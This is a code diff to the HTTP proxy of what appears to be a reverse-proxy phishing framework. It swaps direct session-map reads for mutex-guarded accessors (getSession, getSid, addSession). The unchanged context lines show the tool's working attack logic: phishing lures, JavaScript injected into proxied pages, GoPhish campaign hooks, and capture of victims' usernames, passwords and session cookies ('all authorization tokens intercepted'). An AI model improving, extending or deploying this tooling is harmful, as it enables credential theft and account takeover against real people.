@@ -223,7 +223,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					js_id := ra[2]
 					if strings.HasSuffix(js_id, ".js") {
 						js_id = js_id[:len(js_id)-3]
-						if s, ok := p.sessions[session_id]; ok {
+						if s, ok := p.getSession(session_id); ok {
 							var d_body string
 							var js_params *map[string]string = nil
 							js_params = &s.Params
@@ -248,7 +248,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if strings.HasSuffix(session_id, ".js") {
 						// respond with injected javascript
 						session_id = session_id[:len(session_id)-3]
-						if s, ok := p.sessions[session_id]; ok {
+						if s, ok := p.getSession(session_id); ok {
 							var d_body string
 							if !s.IsDone {
 								if s.RedirectURL != "" {
@@ -263,7 +263,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Warning("js: session not found: '%s'", session_id)
 						}
 					} else {
-						if _, ok := p.sessions[session_id]; ok {
+						if _, ok := p.getSession(session_id); ok {
 							redirect_url, ok := p.waitForRedirectUrl(session_id)
 							if ok {
 								type ResponseRedirectUrl struct {
@@ -271,7 +271,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 								d_json, err := json.Marshal(&ResponseRedirectUrl{RedirectUrl: redirect_url})
 								if err == nil {
-									s_index, _ := p.sids[session_id]
+									s_index, _ := p.getSid(session_id)
 									log.Important("[%d] dynamic redirect to URL: %s", s_index, redirect_url)
 									resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
 									return req, resp
@@ -308,7 +308,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					var ok bool = false
 					sc, err := req.Cookie(session_cookie)
 					if err == nil {
-						ps.Index, ok = p.sids[sc.Value]
+						ps.Index, ok = p.getSid(sc.Value)
 						if ok {
 							create_session = false
 							ps.SessionId = sc.Value
@@ -328,7 +328,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
 								if ok {
 									create_session = false
-									ps.Index, ok = p.sids[ps.SessionId]
+									ps.Index, ok = p.getSid(ps.SessionId)
 								} else {
 									log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 								}*/
@@ -398,8 +398,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.last_sid += 1
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
-									p.sessions[session.Id] = session
-									p.sids[session.Id] = sid
+									p.addSession(session.Id, session, sid)
 
 									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 										rid, ok := session.Params["rid"]
@@ -472,7 +471,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
-					if s, ok := p.sessions[ps.SessionId]; ok {
+					if s, ok := p.getSession(ps.SessionId); ok {
 						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 						if err == nil {
 							// show html redirector if it is set for the current lure
@@ -877,7 +876,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
-					s, ok := p.sessions[ps.SessionId]
+					s, ok := p.getSession(ps.SessionId)
 					if ok && !s.IsDone {
 						for _, au := range pl.authUrls {
 							if au.MatchString(req.URL.Path) {
@@ -937,7 +936,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			redirect_set := false
-			if s, ok := p.sessions[ps.SessionId]; ok {
+			if s, ok := p.getSession(ps.SessionId); ok {
 				if s.RedirectURL != "" {
 					redirect_set = true
 				}
@@ -997,7 +996,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
 					at := pl.getAuthToken(c_domain, ck.Name)
 					if at != nil {
-						s, ok := p.sessions[ps.SessionId]
+						s, ok := p.getSession(ps.SessionId)
 						if ok && (s.IsAuthUrl || !s.IsDone) {
 							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
 								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
@@ -1020,7 +1019,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			body, err := io.ReadAll(resp.Body)
 
 			if pl != nil {
-				if s, ok := p.sessions[ps.SessionId]; ok {
+				if s, ok := p.getSession(ps.SessionId); ok {
 					// capture body response tokens
 					for k, v := range pl.bodyAuthTokens {
 						if _, ok := s.BodyTokens[k]; !ok {
@@ -1048,7 +1047,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check if we have all tokens
 				if len(pl.authUrls) == 0 {
-					if s, ok := p.sessions[ps.SessionId]; ok {
+					if s, ok := p.getSession(ps.SessionId); ok {
 						is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
 						if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
 							is_body_auth = true
@@ -1062,7 +1061,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			if is_cookie_auth && is_body_auth && is_http_auth {
 				// we have all auth tokens
-				if s, ok := p.sessions[ps.SessionId]; ok {
+				if s, ok := p.getSession(ps.SessionId); ok {
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
 
@@ -1100,7 +1099,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if ok {
 							for _, sf := range sfs {
 								var param_ok bool = true
-								if s, ok := p.sessions[ps.SessionId]; ok {
+								if s, ok := p.getSession(ps.SessionId); ok {
 									var params []string
 									for k := range s.Params {
 										params = append(params, k)
@@ -1169,7 +1168,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if stringExists(mime, []string{"text/html"}) {
 
 					if pl != nil && ps.SessionId != "" {
-						s, ok := p.sessions[ps.SessionId]
+						s, ok := p.getSession(ps.SessionId)
 						if ok {
 							if s.PhishLure != nil {
 								// inject opengraph headers
@@ -1178,7 +1177,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 							var js_params *map[string]string = nil
-							if s, ok := p.sessions[ps.SessionId]; ok {
+							if s, ok := p.getSession(ps.SessionId); ok {
 								js_params = &s.Params
 							}
 							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
@@ -1197,7 +1196,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
-				s, ok := p.sessions[ps.SessionId]
+				s, ok := p.getSession(ps.SessionId)
 				if ok && s.IsDone {
 					for _, au := range pl.authUrls {
 						if au.MatchString(resp.Request.URL.Path) {
@@ -1238,7 +1237,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			if pl != nil && ps.SessionId != "" {
-				s, ok := p.sessions[ps.SessionId]
+				s, ok := p.getSession(ps.SessionId)
 				if ok && s.IsDone {
 					if s.RedirectURL != "" && s.RedirectCount == 0 {
 						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
@@ -1266,7 +1265,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 
-	s, ok := p.sessions[session_id]
+	s, ok := p.getSession(session_id)
 	if ok {
 
 		if s.IsDone {
@@ -1552,11 +1551,37 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 	}
 }
 
+// getSession returns the session for the given id, holding session_mtx for the
+// duration of the map read. The handlers run one goroutine per connection, so
+// every access to p.sessions / p.sids must go through these accessors.
+func (p *HttpProxy) getSession(id string) (*Session, bool) {
+	p.session_mtx.Lock()
+	defer p.session_mtx.Unlock()
+	s, ok := p.sessions[id]
+	return s, ok
+}
+
+// getSid returns the numeric session index for the given id.
+func (p *HttpProxy) getSid(id string) (int, bool) {
+	p.session_mtx.Lock()
+	defer p.session_mtx.Unlock()
+	sid, ok := p.sids[id]
+	return sid, ok
+}
+
+// addSession registers a new session and its numeric index atomically.
+func (p *HttpProxy) addSession(id string, s *Session, sid int) {
+	p.session_mtx.Lock()
+	defer p.session_mtx.Unlock()
+	p.sessions[id] = s
+	p.sids[id] = sid
+}
+
 func (p *HttpProxy) setSessionUsername(sid string, username string) {
 	if sid == "" {
 		return
 	}
-	s, ok := p.sessions[sid]
+	s, ok := p.getSession(sid)
 	if ok {
 		s.SetUsername(username)
 	}
@@ -1566,7 +1591,7 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 	if sid == "" {
 		return
 	}
-	s, ok := p.sessions[sid]
+	s, ok := p.getSession(sid)
 	if ok {
 		s.SetPassword(password)
 	}
@@ -1576,7 +1601,7 @@ func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
 	if sid == "" {
 		return
 	}
-	s, ok := p.sessions[sid]
+	s, ok := p.getSession(sid)
 	if ok {
 		s.SetCustom(name, value)
 	}
